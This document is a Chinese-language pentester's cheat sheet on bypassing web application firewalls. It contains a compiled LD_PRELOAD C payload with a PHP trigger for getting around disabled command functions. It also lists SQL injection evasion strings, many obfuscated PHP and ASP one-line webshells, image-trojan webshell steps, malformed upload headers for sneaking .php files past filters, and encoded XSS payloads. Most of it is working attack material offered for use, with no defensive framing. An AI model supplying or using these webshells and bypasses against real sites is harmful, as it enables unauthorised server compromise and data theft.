# web攻击防护
## waf防护原理
* user-agent进行拦截，可以使用爬虫的网址进行绕过，例如百度爬虫（一般使用白名单）
* http检测可以使用post或者cookie值进行绕过（有些之拦截get提交方式）
* http头获取ip可以修改remote-ip或者client-ip
* 文件上传后缀防护
* 敏感函数防护 
* 危险组件防护
* 禁止执行程序
* 一句话拦截
* 内容防护中，会对访问目标进行过滤，有时是使用账号密码，有时是ip限制
* cc攻击防护，限制攻击次数可绕过，或者变换ip
#主体/Waf #方面/基础   


## waf绕过方法
### （1）目录扫描防护绕过
扫描不到任何信息（IP封锁，一般为硬件防火墙，连接重置），扫出来一堆东西（含有waf）
**解决方法：**
* 降低扫描速度
* 爬行工具爬行目录
* 修改`user-agent`
* 尝试代理`ip池`
* 可以尝试白名单服务器扫描（使用加了`白名单ip`）例如：阿里云可以使用阿里云服务器
### （2）特殊文件访问拦截绕过
拦截特殊后缀的文件访问，例如`xxx.sql`或者是`xxx.mdb`
**解决方法：**
* 修改后缀加入垃圾字符搭配匹配规则
* 加入垃圾字符超过拦截长度，绕过防御
* 文件解析，目录解析绕过
### （3）命令执行函数被禁绕过
无法使用web对应的执行函数，执行后没有反应
**解决方法：**
* 使用特定文件`hack.so`文件执行
```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h> 
void payload() {
    system("rm /tmp/check.txt");
}   
int  geteuid() {
if (getenv("LD_PRELOAD") == NULL) { return 0; }
unsetenv("LD_PRELOAD");
payload();
}
```
* 编译文件hack.c
```bash
$ gcc -c -fPIC hack.c -o hack 
$ gcc -shared hack -o hack.so
```
* 再上传到webshell上，然后写一段简单的php代码：
```php
<?php putenv("LD_PRELOAD=/var/www/hack.so"); mail("a@localhost","","","",""); ?>
```
在浏览器中打开就可以执行它，然后再去检查新建的文件是否还存在，找不到文件则表示系统成功执行了删除命令，也就意味着绕过成功，测试中注意修改为实际路径。
### （3）常见waf绕过
wts绕过：
使用\%\%%\%\%\%0a代替空格
360绕过：
使用%0a代替空格
安全狗绕过：
使用`aid=123/*&id=12 and 1=1 &bid=123*/`绕过
宝塔绕过：
使用%截断关键字，即`id=123 an%%%%d 1%%%=%%1`，或者使用大小写混写
#主体/Waf  #方面/绕过方法  #时间/渗透中



## [[SQL注入漏洞|注入漏洞]]绕过waf
### （1）大小写变种
使用起来最简单，效果现在来说不太显著
比如：
`and 1=2`
`AnD 1=3`
### （2）使用SQL注释
使用起来简单，效果一般
`union select 1,2,3,4,5,5 from admin`
**注释完：**
`/**//**/select/**/1,2,3,4,5,5 from admin`
`/**/un/**/io/**/n/**/sel/**/ec/**/t/**/1,2,3,4,5,5 from admin`
**第二种注释：**
`/*!and*/ 1=2 ` 效果显著
### （3）使用URL编码
正常编码
`' 为%27  `
`/ =%2f    *==%2a   %=%25`
`/**/==%252f%252a*/`
### （4）使用空字节
一些过滤器在处理输入时，如果碰到空字节就会停止处理。
我们通常也会利用空字节进行绕过过滤器，如：
`id=1 %00 and 1=2`
access数据库中可以使用%0a代替空格  `%0a%a + %%%%0a`
mysql中`/**/代替空格  /*and*/`
### （5）使用嵌套过剥离
有些过滤器会从用户的输入中进行剥离一些敏感的函数
那我们可以通过函数的嵌套进行绕过一次剥离，selselectect，剥离后，select
### （6）使用非标准入口点
说白了就是攻击他的冷门，需要自己去挖掘，一些连过滤器都没发现的注入点即可
### （7）避开自定义过滤器
一些过滤器他所过滤的字符串都是事先写入写好的，
只要我们输入的的语法和他们过滤的不匹配即可绕过。比如 and，转换为`a+nd，a%nd，'a'nd，%A0and`
### （8）更换提交方式
一些信息提交页面如果get提交不了，被防护，还可以试试post提交
### （9）截断关键字
access数据库中：
`%%%%`截断关键字 `an%%%%%d 1%%%%%=%%1` 可以使waf检测不到关键字
#主体/注入漏洞  #方面/绕过方法  #主体/Waf  #时间/渗透中

  
## webshell过waf
### （1）使用字符串拼接关键词：
`<?php $_REQUEST['a']($_REQUEST['b']); ?>`
`<?php ($_=@$_GET[2]).@$_($_POST[sz])?>`
`<?php $a = str_replace(x,"","axsxxsxexrxxt");$a($_POST["sz"]); ?>`
`<?php $k="ass"."ert"; $k(${"_PO"."ST"} ['sz']);?>`
`<?php $a = "a"."s"."s"."e"."r"."t";  $a($_POST["sz"]); ?>`
`<%eval""&("e"&"v"&"a"&"l"&"("&"r"&"e"&"q"&"u"&"e"&"s"&"t"&"("&"0"&"-"&"2"&"-"&"5"&")"&")")%>`
`<%a=request("gold")%><%eval a%>`
### （2）使用字符编码：
`<%Eval(Request(chr(112)))%>`
`<%eval (eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116))("xindong"))%>`
### （3）一句话过waf
* 使用动态传参，不构成waf查杀的函数
* 或者使用菜刀软件
* 当客户端怎么都过不掉waf时，可以将大马进行免杀
* 使用站马分离（上传免杀小马，其中使用远程代码加载大马代码到目标服务器上执行）有时需要改写大马代码
### （4）大马免杀
* 可以使用图片码绕过waf
* 可以使用站马分离
### （5）一句话图片木马
* 寻找图片使用c32或者hex打开的软件打开图片
* 将一句话木马插入到图片中
* 实验将图片上传到服务器，并且更改后缀为服务器对应的脚本
* 使用菜刀或者webshell连接器进行连接，如果不成功则是图片中的某些字符干扰了一句话木马，跟换图片再试
* 上传图片格式配置解析漏洞拿shell
* 文件包含拿shell
#主体/Webshell  #方面/绕过方法  #主体/Waf 


## 上传过waf
### （1）长度绕过，增加垃圾长度
`Content-Disposition：for++++++++++++++++m-data；name=“upfile”；filename=“1.php”`
`Content-Disposition：form-data；name=“upfile”；ahfoaweihaoiehwnv；filename=“1.php”`
### （2）文件名称引号不对称
`filename=“1.php`
`filename=”1.php“”`
### （3）文件名多个=号
`filename==========“1.php”`
### （4）文件名称里添加分号或者垃圾字符
`filename=“1 xvzdva&s；1.php”`
### （5）文件名称换行
`filename=`
`“1.php”`
### （6）删除bannery信息



## XSS payload过waf
### （1）编码绕过
* html实体编码，例如：`&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x29;`
* 进制类，例如：`\x61\x6c\x65\x72\x74\x60\x78\x73\x73\x60`，某些时候，也有不带x,例如：\5c\6a
* Unicode，例如：`\u0061\u006c\u0065\u0072\u0074\u0060\u4e2d\u6587\u4e5f\u53ef\u4ee5\u0060`
* 纯转义，例如：`'   "   <   >` ,这样的在特殊字符前加\进行转义。
### （2）字符拼接
todo
### （3）js加密
todo
### （4）调用后缀修改
todo




